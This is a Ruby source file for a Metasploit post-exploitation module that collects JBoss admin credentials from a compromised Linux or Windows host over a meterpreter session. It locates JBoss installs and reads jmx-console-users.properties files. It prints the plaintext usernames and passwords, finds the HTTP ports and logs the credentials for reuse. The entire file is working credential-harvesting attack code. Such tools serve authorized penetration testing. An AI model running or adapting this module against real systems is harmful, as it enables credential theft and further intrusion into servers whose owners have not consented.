require 'msf/core'
require 'nokogiri'

class MetasploitModule < Msf::Post
    include Msf::Post::File
    include Msf::Post::Linux::System

    def initialize(info={})
    super(update_info(info,
        'Name'          => 'Jboss credential collector',
        'Description'   => %q{
          This module can be used to extract the Jboss admin passwords for version 4,5 and 6.
        },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'Koen Riepe (koen.riepe@fox-it.com)' ],
        'Platform'      => [ 'linux', 'win' ],
        'SessionTypes'  => [ 'meterpreter' ]
    ))
    end

    def report_creds(user, pass, port)
        return if (user.empty? or pass.empty?)
            # Assemble data about the credential objects we will be creating
            credential_data = {
                origin_type: :session,
                post_reference_name: self.fullname,
                private_data: pass,
                private_type: :password,
                session_id: session_db_id,
                username: user,
                workspace_id: myworkspace_id,
            }

            credential_core = create_credential(credential_data)
            
            if not port.is_a? Integer
                print_status("Port not an Integer, Something probably went wrong")
                port = 8080
            end

            login_data = {
                core: credential_core,
                status: Metasploit::Model::Login::Status::UNTRIED,
                address: ::Rex::Socket.getaddress(session.sock.peerhost, true),
                port: port,
                service_name: 'jboss',
                protocol: 'tcp',
                workspace_id: myworkspace_id
            }
            create_credential_login(login_data)
    end

    def OScheck()
    os  = ""
    if exist?("/etc/passwd")
      os =  "unix"
    else
      os = "win"
    end
    return os
    end

    def getpw(file, ports)
        i = 0
        file.each do |pwfile|
            lines = read_file(pwfile).split("\n")
              for line in lines
                  if not line.include? "#"
                      creds = line.split("=")
                      print_good("Username: " + creds[0] + " Password: " + creds[1])
                      report_creds(creds[0],creds[1],ports[i])
                  end
              end
              i+=1
        end
    end

    def getversion(array)
        i = 0
        version = "NONE"
        results = Array.new
        while i < array.count
            downcase = array[i].downcase
            if downcase.include? "jboss"
                file = read_file(array[i])
                xml_doc  = Nokogiri::XML(file)
                xml_doc.xpath("//jar-versions//jar").each do |node|
                    if node["name"] == "jbossweb.jar"
                        version = node["specVersion"][0]
                        results.push(version)
                    end
                end
            end
            if not version == "NONE"
                print_status("Found a Jboss installation version:" + version)
            end
            i+=1
        end
        return results
    end

    def readhome(array)
        home = ""
        array.each do |item|
            if item.include? "JBOSS_HOME"
                home = item.split("JBOSS_HOME=")[1]
            end
        end
        return home
    end

    def getpwfiles(array,home)
        pwfiles = Array.new
        array.each do |location|
            if location.include? home
                pwfiles.push(location)
            end
        end
        return pwfiles
    end

    def getports()
        type1 = cmd_exec('locate bindings-jboss-beans.xml').split("\n")
        type2 = cmd_exec('locate jboss-web.deployer/server.xml').split("\n")
        port = Array.new

        type1.each do |file1|
            print_status("Bind file found: " + file1)
            xml1  = Nokogiri::XML(read_file(file1))
            xml1.css("//deployment//bean//constructor//parameter//bean").each do |connector|
                if connector.css("property[name='serviceName']").text == "jboss.web:service=WebServer"
                    port.push(connector.css("property[name='port']").text.to_i)
                    break
                end
            end
        end

        type2.each do |file2|
            print_status("Bind file found: " + file2)
            xml2  = Nokogiri::XML(read_file(file2))
            xml2.xpath("//Server//Connector").each do |connector|
                if connector['protocol'].include? "HTTP"
                    port.push(connector['port'].to_i)
                    break
                end
            end
        end
        return port
    end

    def gathernix()
        print_status("Unix OS detected, attempting to locate Jboss services")
        version = getversion(cmd_exec('locate jar-versions.xml').split("\n"))
          home = readhome(cmd_exec('printenv').split("\n"))
          pwfiles = getpwfiles(cmd_exec('locate jmx-console-users.properties').split("\n"),home)
          listenports = getports()
          getpw(pwfiles,listenports)
    end

    def winhome()
        exec = cmd_exec('WMIC PROCESS get Caption,Commandline').split("\n")
           exec.each do |line|
               if line.downcase.include? "java.exe" and line.downcase.include? "jboss"
                   print_status("Jboss process found")
                   home = line.split('-classpath "')[1].split("\\bin\\")[0]
                   return home
               end
           end
       end

       def wingetinstances(home)
           instances = Array.new
           instance_location = home + "\\server"
           exec = cmd_exec('cmd /c dir ' + instance_location).split("\n")
           exec.each do |instance|
               if instance.split("<DIR>")[1]
                   if (not instance.split("<DIR>")[1].strip().include? ".") and (not instance.split("<DIR>")[1].strip().include? "..")
                       instance_path = home + "\\server\\" + (instance.split("<DIR>")[1].strip())
                       instances.push(instance_path)
                       #print_good(instance_path)
                   end
               end
           end
           return instances
       end

       def winpwfiles(instances)
           files = Array.new
           instances.each do |seed|
               file_path = seed + "\\conf\\props\\jmx-console-users.properties"
               if exist?(file_path) 
                   files.push(file_path)
               end
           end
           return files
       end

       def wingetport(instances)
           port = Array.new

        instances.each do |seed|
            path1 = seed + "\\conf\\bindingservice.beans\\META-INF\\bindings-jboss-beans.xml"
            path2 = seed + "\\deploy\\jboss-web.deployer\\server.xml"

            if exist?(path1)
                file1 = read_file(seed + "\\conf\\bindingservice.beans\\META-INF\\bindings-jboss-beans.xml").split("\n")
            end

            if exist?(path2)
                file2 = read_file(seed + "\\deploy\\jboss-web.deployer\\server.xml")
            end

            if file1
                print_status("Bind file found: " + seed + "\\conf\\bindingservice.beans\\META-INF\\bindings-jboss-beans.xml")
                parse = false
                nextport = false
                file1.each do |line|
                    if line.strip() == '<bean class="org.jboss.services.binding.ServiceBindingMetadata">'
                        parse = true
                    elsif line.strip() == '</bean>'
                        parse = false
                    elsif parse and line.include? "HttpConnector"
                        nextport = true
                    elsif parse and nextport
                        port.push(line.split('<property name="port">')[1].split('<')[0].to_i)
                        nextport = false
                    end
                end
            end

            if file2
                print_status("Bind file found: " + seed + "\\deploy\\jboss-web.deployer\\server.xml")
                xml2  = Nokogiri::XML(file2)
                xml2.xpath("//Server//Connector").each do |connector|
                    if connector['protocol'].include? "HTTP"
                        print_status(connector['port'])
                        port.push(connector['port'].to_i)
                        break
                    end
                end
            end
        end
        return port
       end

    def gatherwin()
        print_status("Windows OS detected, enumerating services")
        home = winhome()
        version_file = Array.new
        version_file.push(home + "\\jar-versions.xml")
        version = getversion(version_file)
        instances = wingetinstances(home)
        pwfiles = winpwfiles(instances)
        listenports = wingetport(instances)
        getpw(pwfiles,listenports)
    end

    def run
        if OScheck() == "win"
          gatherwin()
        else 
          gathernix()
        end
    end

end
